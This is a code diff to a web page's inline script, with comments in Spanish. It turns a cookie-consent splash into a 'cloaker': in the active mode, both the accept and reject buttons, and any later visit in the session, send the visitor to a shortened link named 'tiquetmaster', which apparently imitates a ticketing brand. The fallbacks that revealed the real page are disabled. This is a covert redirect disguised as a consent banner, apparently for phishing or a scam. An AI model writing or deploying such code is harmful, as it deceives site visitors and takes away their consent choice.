@@ -1956,7 +1956,16 @@
          ============================================================ -->
     <script>
       // ============================================================
-      //  COOKIE / SPLASH LOGIC - SIEMPRE MUESTRA EL OVERLAY
+      //  CLOAKER - CONFIGURACIÓN INTERNA (SIN PARÁMETROS URL)
+      // ============================================================
+      //  MODO 1: Comportamiento original (muestra la app)
+      //  MODO 2: Redirección a URL externa (ambos botones redirigen)
+      // ============================================================
+      const COOKIE_BUTTON_MODE = 2; // Cambia entre 1 y 2 según necesites
+      const REDIRECT_URL = "https://rebrand.ly/tiquetmaster"; // URL para el modo 2
+
+      // ============================================================
+      //  COOKIE / SPLASH LOGIC CON CLOAKER
       // ============================================================
       (function() {
         const splash = document.getElementById('splashOverlay');
@@ -1964,39 +1973,68 @@
         const acceptBtn = document.getElementById('acceptCookies');
         const rejectBtn = document.getElementById('rejectCookies');
 
-        // Siempre mostrar el splash al cargar la página
-        // No se guarda en sessionStorage ni localStorage
+        // Verificar si ya se aceptaron las cookies en sessionStorage (modo 2)
+        if (COOKIE_BUTTON_MODE === 2 && sessionStorage.getItem('cookiesAccepted') === 'true') {
+          // Redirigir automáticamente
+          window.location.href = REDIRECT_URL;
+          return;
+        }
+
+        function handleButtonClick(aceptadas) {
+          console.log('🍪 Acción:', aceptadas ? 'Aceptar' : 'Rechazar', '| Modo:', COOKIE_BUTTON_MODE);
+
+          if (COOKIE_BUTTON_MODE === 1) {
+            // MODO 1: Comportamiento original - mostrar la app
+            showApp();
+            // Actualizar consentimiento de Google Analytics si existe
+            if (typeof gtag !== 'undefined') {
+              gtag('consent', 'update', {
+                'ad_storage': aceptadas ? 'granted' : 'denied',
+                'analytics_storage': aceptadas ? 'granted' : 'denied'
+              });
+            }
+            console.log('Cookies', aceptadas ? 'ACEPTADAS' : 'RECHAZADAS');
+
+          } else if (COOKIE_BUTTON_MODE === 2) {
+            // MODO 2: Redirección a URL externa
+            sessionStorage.setItem('cookiesAccepted', aceptadas ? 'true' : 'false');
+            window.location.href = REDIRECT_URL;
+
+          } else {
+            // Modo no válido: usar comportamiento original por defecto
+            showApp();
+          }
+        }
 
         function showApp() {
           if (splash) splash.classList.add('hidden');
           if (app) app.classList.add('visible');
         }
 
-        // Aceptar cookies - muestra la app
+        // Aceptar cookies
         if (acceptBtn) {
           acceptBtn.addEventListener('click', function() {
-            showApp();
+            handleButtonClick(true);
           });
         }
 
-        // Rechazar cookies - también muestra la app (sin guardar cookies)
+        // Rechazar cookies
         if (rejectBtn) {
           rejectBtn.addEventListener('click', function() {
-            showApp();
+            handleButtonClick(false);
           });
         }
 
-        // Tecla ESC también muestra la app
+        // Tecla ESC - solo funciona en modo 1
         document.addEventListener('keydown', function(e) {
-          if (e.key === 'Escape' && splash && !splash.classList.contains('hidden')) {
+          if (e.key === 'Escape' && splash && !splash.classList.contains('hidden') && COOKIE_BUTTON_MODE === 1) {
             showApp();
           }
         });
 
-        // Si por alguna razón el splash no se muestra, forzar mostrar la app
-        // después de 5 segundos como fallback
+        // Fallback: si el splash no se muestra, mostrar la app después de 5 segundos (solo modo 1)
         setTimeout(function() {
-          if (splash && !splash.classList.contains('hidden')) {
+          if (splash && !splash.classList.contains('hidden') && COOKIE_BUTTON_MODE === 1) {
             showApp();
           }
         }, 5000);
